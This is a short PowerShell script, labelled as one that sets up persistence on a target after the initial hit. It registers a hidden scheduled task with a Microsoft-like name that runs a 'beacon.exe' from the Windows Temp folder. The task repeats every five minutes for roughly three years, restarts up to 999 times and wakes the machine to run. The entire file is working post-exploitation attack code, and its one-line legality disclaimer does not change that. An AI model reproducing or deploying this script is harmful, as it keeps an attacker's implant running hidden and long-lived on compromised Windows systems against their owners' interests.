##POWERSHELL SCRIPT TO SET-UP PERSISTENCE ON A TARGET AFTER THE INITIAL HIT.
##DO NOT USE FOR ILLEGL PURPOSES

echo [+]Creating Task...

#action
$taskAction = New-ScheduledTaskAction `
    -Execute 'C:\Windows\Temp\beacon.exe'

#triggering
$trigger = New-ScheduledTaskTrigger `
    -Daily `
    -At 11:00AM 

$settings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RunOnlyIfNetworkAvailable `
    -WakeToRun `
    -RestartCount 999 `
    -RestartInterval (New-TimeSpan -Minutes 1)

#creation
$task = Register-ScheduledTask `
    -Action $taskAction `
    -Trigger $trigger `
    -TaskName "MicrosoftExt\Powersistence" `
    -Description "REMAIN PERSISTENT!!!" `
    -Settings $settings

#repetition
$task.Triggers.Repetition.Duration = "P1075D"
$task.Triggers.Repetition.Interval = "PT5M"
$task | Set-ScheduledTask

echo [+] Task Created!
